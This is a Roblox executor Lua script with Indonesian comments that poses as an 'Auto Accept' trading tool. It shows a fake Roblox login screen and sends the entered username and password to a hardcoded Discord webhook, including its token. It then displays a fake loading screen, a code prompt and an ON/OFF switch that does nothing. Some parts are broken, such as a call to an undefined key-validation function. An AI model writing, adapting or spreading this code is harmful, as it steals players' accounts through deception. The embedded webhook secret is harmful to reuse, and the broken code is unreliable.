-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local subtitleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Subtitle Label
    subtitleLabel.Name = "SubtitleLabel"
    subtitleLabel.Parent = frame
    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Font = Enum.Font.SourceSans
    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
    subtitleLabel.TextSize = 16
    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

    -- Username Box
    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Login Button
    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Login Button
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            print("Login berhasil! Username:", username, "Password:", password)
            sendToDiscord(username, password)
            gui:Destroy()

            -- Menambahkan loading sebelum GUI selanjutnya
            local loadingGui = Instance.new("ScreenGui")
            loadingGui.Parent = game.CoreGui or game:GetService("CoreGui")
            local loadingFrame = Instance.new("Frame")
            loadingFrame.Parent = loadingGui
            loadingFrame.Size = UDim2.new(0, 300, 0, 100)
            loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
            loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            loadingFrame.BorderSizePixel = 3
            loadingFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)

            local loadingLabel = Instance.new("TextLabel")
            loadingLabel.Parent = loadingFrame
            loadingLabel.Size = UDim2.new(1, 0, 1, 0)
            loadingLabel.BackgroundTransparency = 1
            loadingLabel.Font = Enum.Font.SourceSans
            loadingLabel.Text = "Loading..."
            loadingLabel.TextSize = 20
            loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

            -- Delay 8 detik sebelum menampilkan GUI ketiga
            wait(8)
            loadingGui:Destroy()
            createCodeEntryGUI() -- Memanggil GUI ketiga
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Fungsi Membuat GUI Ketiga (Kode)
local function createCodeEntryGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local codeBox = Instance.new("TextBox")
    local submitButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "CodeEntryGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "CodeFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Code Box
    codeBox.Name = "CodeBox"
    codeBox.Parent = frame
    codeBox.Size = UDim2.new(1, -20, 0, 40)
    codeBox.Position = UDim2.new(0, 10, 0, 60)
    codeBox.PlaceholderText = "Masukkan Kode 6 Digit"
    codeBox.Font = Enum.Font.SourceSans
    codeBox.Text = ""
    codeBox.TextSize = 14
    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Submit Button
    submitButton.Name = "SubmitButton"
    submitButton.Parent = frame
    submitButton.Size = UDim2.new(1, -20, 0, 40)
    submitButton.Position = UDim2.new(0, 10, 0, 130)
    submitButton.Text = "Submit"
    submitButton.Font = Enum.Font.SourceSansBold
    submitButton.TextSize = 16
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Submit Button
    submitButton.MouseButton1Click:Connect(function()
        local code = codeBox.Text
        if code == "123456" then -- Ganti dengan kode valid Anda
            print("Kode benar!")
            gui:Destroy()
            createSwitchGUI() -- Menampilkan GUI keempat
        else
            print("Kode salah!")
        end
    end)
end

-- Fungsi Membuat GUI Keempat (Switch)
local function createSwitchGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local switchButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "SwitchGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "SwitchFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Switch Button (On/Off)
    switchButton.Name = "SwitchButton"
    switchButton.Parent = frame
    switchButton.Size = UDim2.new(1, -20, 0, 40)
    switchButton.Position = UDim2.new(0, 10, 0, 100)
    switchButton.Text = "ON"
    switchButton.Font = Enum.Font.SourceSansBold
    switchButton.TextSize = 16
    switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    switchButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Switch Button
    switchButton.MouseButton1Click:Connect(function()
        if switchButton.Text == "ON" then
            switchButton.Text = "OFF"
            switchButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
            print("Auto Accept OFF")
        else
            switchButton.Text = "ON"
            switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
            print("Auto Accept ON")
        end
    end)
end

-- Memulai Script dengan GUI Pertama
createKeyValidationGUI()
